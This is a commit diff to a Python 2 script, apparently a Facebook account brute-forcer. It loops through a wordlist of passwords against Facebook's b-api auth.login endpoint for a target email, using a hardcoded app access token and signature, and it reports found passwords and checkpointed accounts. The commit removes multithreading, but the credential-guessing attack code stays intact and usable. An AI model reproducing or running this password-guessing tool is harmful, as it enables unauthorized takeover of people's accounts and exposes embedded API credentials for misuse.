4f0ec1b41f871ccb7a7dafd18957574da0c7de4e
Iqbal_Dev <47203081+IqbalDev@users.noreply.github.com>
2019-06-26 18:52:18 +0700

    Update mbf.py

--- mbf.py
+++ mbf.py
@@ -4,10 +4,6 @@ import time
 import json
 import urllib
 import requests
-import threading
-
-threads = []
-count = []
 
 def login():
     
@@ -33,20 +29,8 @@ def login():
         else:
             print " Gagal Login..."
 
-def sup():
-    try:
-        for iqbal in range(30):
-            ival = threading.Thread(target=multi, args=())
-            ival.start()
-            threads.append(ival)
-        
-        for ival in threads:
-            ival.join()
-    except IOError:
-        print " Tidak ada Wordlist"
 
 def multi():
-    global count
 
     word1 = open("word.txt", "r")
     iv = word1.read().split()
@@ -55,8 +39,7 @@ def multi():
         log = ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + word + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
         dev = urllib.urlopen(log)
         js = json.load(dev)
-        if count == len(iv):
-            break
+       
         if "access_token" in js:
             print " Found: " + word
             sys.exit()
@@ -108,7 +91,7 @@ def brute():
                 elif "www.facebook.com" in js["error_msg"]:
                     print " Akun Cekpoint" + sandi3
                 else:
-                    sup()
+                    multi()
                    
 login()
 brute()
